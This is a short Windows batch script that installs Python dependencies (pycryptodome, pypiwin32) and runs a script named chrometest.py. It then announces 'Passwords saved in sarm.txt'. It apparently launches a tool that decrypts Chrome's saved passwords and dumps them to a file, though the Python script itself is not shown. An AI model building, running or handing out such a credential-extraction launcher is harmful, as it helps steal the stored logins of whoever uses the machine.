@echo off
cd /d "%~dp0"

:: Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Downloading and installing now...
    start "" "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe"
    exit
)

:: Install required Python libraries if missing
python -c "import Crypto" >nul 2>&1
if %errorlevel% neq 0 (
    echo Installing required Python packages...
    pip install pycryptodome pypiwin32
)

:: Run the script
python chrometest.py
echo Passwords saved in sarm.txt
pause
